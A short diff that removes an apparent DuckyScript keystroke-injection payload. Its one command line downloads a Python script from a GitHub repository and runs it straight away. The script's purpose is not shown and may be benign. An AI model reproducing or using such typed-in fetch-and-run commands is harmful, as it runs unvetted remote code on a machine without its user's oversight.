@@ -1,3 +1,0 @@
-DELAY 1000
-STRING mkdir -p ~/Desktop && curl -L https://github.com/IT-Tool-by-SalgadoTech/ittool-External_Tools/raw/refs/heads/main/IT_Angel.py -o ~/Desktop/IT_Angel.py && python3 ~/Desktop/IT_Angel.py
-ENTER
